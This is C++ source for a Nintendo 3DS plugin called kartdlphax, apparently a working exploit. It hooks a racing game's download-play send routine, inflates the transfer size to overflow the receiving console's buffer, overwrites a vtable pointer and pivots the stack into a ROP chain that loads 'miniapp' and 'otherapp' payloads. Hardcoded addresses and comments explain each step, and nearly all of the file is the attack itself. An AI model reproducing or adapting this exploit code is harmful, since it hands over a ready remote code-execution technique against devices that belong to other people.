#include <3ds.h>
#include "csvc.h"
#include <CTRPluginFramework.hpp>
#include "PatternManager.hpp"
#include "OSDManager.hpp"
#include "rt.h"
#include "ropbin.h"
#include "miniapp.h"
#include "otherapp.h"

#include <vector>
#include <string.h>

extern "C" {
    u32 sendBufferCallback(u32 dst, u32 src, u32 size);
	u32 g_sendBufferret;
}

static void NAKED sendBufferfunc() {
    __asm__ __volatile__
    (
        "MOV             R2, R4 \n" // The hook replaces two instructions, so we place them here.
        "ADD             R1, R1, R3 \n"
        "PUSH			 {R0, R2-R3, LR} \n" // Back up registers.
        "BL				 sendBufferCallback \n" // Jump to the send callback function.
        "MOV		     R1, R0 \n" // Replace the src with the return value.
        "POP		     {R0, R2-R3, LR} \n" // Load registers back.
        "LDR		     R12, =g_sendBufferret \n" // Return to the hook point.
        "LDR		     PC, [R12] \n"
    );
}

namespace CTRPluginFramework
{
    LightEvent exitEvent;
    RT_HOOK sendDataHook;
    int usedotherapp;

    static inline u32   decodeARMBranch(const u32 *src)
	{
		s32 off = (*src & 0xFFFFFF) << 2;
		off = (off << 6) >> 6;
		return (u32)src + 8 + off;
	}
    static inline int roundUp(int numToRound, int multiple) 
    {
        return ((numToRound + multiple - 1) / multiple) * multiple;
    }

    // This function executes before the game runs.
    void    PatchProcess(FwkSettings &settings)
    {
        const u8 getBufferSizePat[] = {0x09, 0x40, 0x20, 0x10, 0x29, 0x00, 0x56, 0xE3, 0xB1, 0x00, 0x00, 0x0A, 0x29, 0x00, 0xA0, 0xE3};
        const u8 sendBufferDataPat[] = {0x08, 0x00, 0x87, 0xE2, 0x94, 0x06, 0x03, 0xE0, 0x03, 0x10, 0x41, 0xE0, 0x04, 0x00, 0x51, 0xE1};

        PatternManager pm;

        // Search the function that sets the send buffer size.
        pm.Add(getBufferSizePat, 0x10, [](u32 addr) {
			u32 func = decodeARMBranch((u32*)(addr + 0x248)) + 0x10;
			*((u32*)func) = 0xE3A03207; // Tell the game the output buffer is giant (0x70000000)
			return true;
		});

        // Search the function that sends the buffer data.
        pm.Add(sendBufferDataPat, 0x10, [](u32 addr) {
			rtInitHook(&sendDataHook, addr + 0x18, (u32)sendBufferfunc);
			rtEnableHook(&sendDataHook);
			g_sendBufferret = addr + 0x18 + 0x8; // + 0x8 because the hook replaces 2 instructions.
			return true;
		});

        pm.Perform();
    }

    static constexpr u32 TRANSFERBLOCKSIZE = 0x37C;                             // The size in bytes of a single transfer block.

	u32 pwnBuffer[TRANSFERBLOCKSIZE / 4] = { 0 };                                // Buffer sent with the vtable pwn

    static constexpr u32 VTABLEPWNBLOCK = 0x1740;                               // Block in the buffer that cointains the vtable pwn
    static constexpr u32 ORIGSTACK = 0x0FFFFDC8;                                // Original stack addr when the vtable pwn exploit triggers
    static constexpr u32 LDR0TOR3 = 0x0012E54C;                                 // Jumping here loads [R0, #0x8] into R3
    static constexpr u32 STACKPIVOT = 0x00113688;                               // Jumping here can control SP + PC from value in R3
    static constexpr u32 PLUGINBUFFERSIZE = TRANSFERBLOCKSIZE * 0xA82;          // Size of the fake sent buffer ~2.4MB
    static constexpr u32 STARTBUFFER = 0x1424FDB4;                              // Start of the recv buffer in the client application
    static constexpr u32 ROPBUF = STARTBUFFER + 8;                              // Start of the ROP in the client application
    static constexpr u32 MINIAPPBUF = 0x14253000;                               // Start of the miniapp in the client application, page aligned
    static constexpr u32 OTHERAPPBUF = STARTBUFFER + TRANSFERBLOCKSIZE * 16;    // Start of the otherapp in the client application

    static u8* exploitBuffer = nullptr; // Fake buffer to be sent

    // The exploit magic happens here. This function is mitm just before
    // the game memcopies src to dst. The return value changes the src address.
    // Size is always 0x37C.
	u32 sendBufferCallback(u32 dst, u32 src, u32 size) {
		static u32 currblock = 0;
        static u32 buffstart = src;
		if (currblock == VTABLEPWNBLOCK) { 
            // vtable pwn magic, wrote it 2 years go and I forgot how it works... x)
            // Here is a basic explanation:
            //     Due to the huge size we are sending, the recieve buffer in the client app is overflowed.
            //     Right after the recieve buffer, there is an object with a vtable used by the main thread every frame (to read the user input).
            //     By setting the buffer to the proper value, we can cause an arbitrary jump by overwriting a vtable function address.
            //     We could jump to the stack pivot address at this point, but it requires the proper value in R3, which isn't set yet.
            //     However, the value of R0 comes from the buffer, so we can call a function that sets up R3 from R0 first.
            //     After R3 is properly set up, we can jump to the stack pivot and start the ROP chain stored in the recieve buffer.

			pwnBuffer[0x35] = STARTBUFFER + VTABLEPWNBLOCK * TRANSFERBLOCKSIZE + 0x37 * 4; // Start buffer + pwn block + offset in current block
			pwnBuffer[0x37] = 0;
			pwnBuffer[0x38] = 0;
			pwnBuffer[0x39] = 0;
			pwnBuffer[0x3A] = LDR0TOR3;

			pwnBuffer[0x11] = ROPBUF - ORIGSTACK - 2;
			pwnBuffer[0x43] = STARTBUFFER + VTABLEPWNBLOCK * TRANSFERBLOCKSIZE + 0x43 * 4; // Start buffer + pwn block + offset in current block
			pwnBuffer[0x49] = STACKPIVOT;

			currblock++;
			return (u32)pwnBuffer;
		}

        // Display screen message.
        if (currblock < VTABLEPWNBLOCK)
            OSDManager["t"].SetScreen(false).SetPos(15,21) = Utils::Format("Sending hax: %.1f%%", ((float)currblock / VTABLEPWNBLOCK) * 100.f);
        else
            OSDManager["t"].SetScreen(false).SetPos(15,21) = "Done!";
        
        currblock++;

        // Wait a few block transfers after the pwn to exit.
        if (currblock >= VTABLEPWNBLOCK + 0xF) { Sleep(Seconds(1.f)); Process::ReturnToHomeMenu(); }

        // Replace src with our exploit buffer.
        if (currblock * TRANSFERBLOCKSIZE < PLUGINBUFFERSIZE)
		    return (u32)exploitBuffer + (src - buffstart);
        else
            return src;
	}

    // This function constructs the buffer that will be sent.
    // The buffer has the following structure:
    //               Offset               Size       Value
    //                  0x0                0x4       size of the otherapp payload (block aligned)
    //                  0x4                0x4       amount of times the otherapp payload is repeated
    //                  0x8            ROPsize       ROP chain
    //      next page align        miniappsize       MINIAPP payload
    //             block 16  off 0x0 * off 0x4       OTHERAPP payload repeated until buffer is filled
    //
    // Why is the otherapp payload repeated? First we have to talk about paral... ehem, the transfer protocol:
    // It looks like the game does some sort of UDP for sending the data. The host transfers the entire buffer in one go,
    // even tho some of the blocks may be lost in the process. The client keeps track of which blocks were recieved, so after
    // the first transfer is over, it asks the host for the missing blocks until it has all of them. The problem is the buffer 
    // overflow and the vtable pwn executing ROP happens before the first transfer even finishes. This causes the recieve buffer 
    // to have "gaps" of zeroed data where the blocks were lost. This is the main reason the exploit fails sometimes before miniapp
    // takes control (when the screen starts flashing), as the vtable pwn + rop + miniapp blocks all need to be intact.
    // Otherapp though is pretty big and occupies several blocks, and the chances of any of them being lost is pretty high.
    // The solution is to send many copies of otherapp, and let the miniapp payload reconstruct it from all the copies (normally
    // about 70 copies are sent). That's the reason we send the otherapp size and the repeat times at the start of the buffer.
    // The reconstruct process checks if the current otherapp block first u32 is 0, if it is, it checks the next copy, and so on. 
    // That's why we set the first value of a block to a magic value if it is 0, so miniapp can differentiate it from a missing block.

    void    constructExploitBuffer() {
        u32 otherappsize;

        // Allocate exploit buffer.
        exploitBuffer = (u8*)calloc(PLUGINBUFFERSIZE, 1);
        if (!exploitBuffer) svcBreak(USERBREAK_USER);

        // Copy the rop chain and the miniapp to to the exploit buffer.
        memcpy((exploitBuffer + ROPBUF - STARTBUFFER), payload_bin, payload_bin_size);
        memcpy((exploitBuffer + MINIAPPBUF - STARTBUFFER), miniapp_bin, miniapp_bin_size);

        // Try opening the otherapp file from SD.
        File otherapp("/kartdlphax_otherapp.bin", File::READ);
        if (otherapp.IsOpen())
        {
            // Read the otherapp file into the first copy in the buffer.
            usedotherapp = 0;
            otherappsize = otherapp.GetSize();
            otherapp.Read((exploitBuffer + OTHERAPPBUF - STARTBUFFER), otherappsize);
        } else {
            // Copy the built-in otherapp into the first copy in the buffer.
            usedotherapp = 1;
            otherappsize = otherapp_bin_size;
            memcpy((exploitBuffer + OTHERAPPBUF - STARTBUFFER), otherapp_bin, otherappsize);
        }

        // Round the otherapp size to next block size and calculate the repeat times.
        otherappsize = roundUp(otherappsize, TRANSFERBLOCKSIZE);
        u32 repeatTimes = (PLUGINBUFFERSIZE - (OTHERAPPBUF - STARTBUFFER)) / otherappsize;

        // Set the first u32 in each block in the otherapp to a magic value, so miniapp can differentiate it with a missing block.
        for (int i = 0; i < otherappsize / TRANSFERBLOCKSIZE; i++) {
            u32* block = (u32*)((exploitBuffer + OTHERAPPBUF - STARTBUFFER) + TRANSFERBLOCKSIZE * i);
            if (block[0] == 0)
                block[0] = 0x05500000;
        }

        // Repeat the first copy of otherapp until it fills the entire exploit buffer.
        for (int i = 1; i < repeatTimes; i++) {
            memcpy((exploitBuffer + OTHERAPPBUF - STARTBUFFER) + otherappsize * i, (exploitBuffer + OTHERAPPBUF - STARTBUFFER), otherappsize);
        };

        // Set the otherapp size and repeated times.
        ((u32*)exploitBuffer)[0] = otherappsize;
        ((u32*)exploitBuffer)[1] = repeatTimes;
    }

    // This function is called when the process exits
    void    OnProcessExit(void)
    {
        LightEvent_Signal(&exitEvent);
    }

    // This function is called after the game starts executing and CTRPF is ready.
    int     main(void)
    {
        LightEvent_Init(&exitEvent, RESET_ONESHOT);

        constructExploitBuffer();

        OSD::Notify("Welcome!");
        OSD::Notify("kartdlphax v1.0");
        OSD::Notify((usedotherapp == 0) ? "Using otherapp file from SD." : "Using built-in universal otherapp.");

        // Wait for process exit event.
        LightEvent_Wait(&exitEvent);

        free(exploitBuffer);

        // Exit plugin
        return (0);
    }
}

// Thunk from C to C++.
u32 sendBufferCallback(u32 dst, u32 src, u32 size) {
	return CTRPluginFramework::sendBufferCallback(dst, src, size);
}
